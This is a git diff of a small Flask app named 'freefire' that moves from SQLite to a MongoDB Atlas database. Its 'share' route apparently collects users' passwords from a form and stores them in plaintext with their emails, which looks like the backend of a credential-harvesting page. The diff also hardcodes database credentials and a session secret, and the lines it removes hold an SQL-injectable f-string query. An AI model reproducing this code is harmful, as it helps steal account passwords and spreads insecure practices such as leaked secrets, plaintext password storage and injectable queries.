@@ -1,11 +1,13 @@
 from flask import Flask, render_template, request,session,redirect
-import sqlite3
+from pymongo import MongoClient
 import re
 
 from flask.helpers import url_for
 
 app=Flask(__name__)
 app.secret_key = "($usdanw*&" 
+client=MongoClient('mongodb+srv://siva:(#*mongodb*#)@cluster0.yudpn.mongodb.net/freefire?retryWrites=true&w=majority')
+db=client.freefire
 
 @app.route('/')
 def index():
@@ -29,11 +31,7 @@ def share():
         else:
             email=session['user']
             passwd=request.form['password']
-        con=sqlite3.connect('static/ff-user.db')
-        cur=con.cursor()
-        cur.execute(f"insert into user(username,password) values('{email}','{passwd}')")
-        con.commit()
-        con.close()
+        db.users.insert_one({"user":email,"password":passwd})
         return render_template('share.html')
     else: return redirect(url_for('index'))
 
